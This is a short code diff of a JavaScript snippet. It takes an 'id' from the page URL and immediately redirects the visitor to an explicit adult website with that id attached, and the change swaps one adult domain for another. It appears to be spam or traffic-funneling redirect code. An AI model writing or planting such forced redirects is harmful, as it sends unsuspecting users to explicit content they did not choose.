@@ -8,6 +8,6 @@
   }
   
  var id = new URLSearchParams(location.search).get("id");
-    window.location.href = `https://girlsexhub.com/?tid=${id}`;
+    window.location.href = `https://livesexvideo.pages.dev/?tid=${id}`;
 
 })();
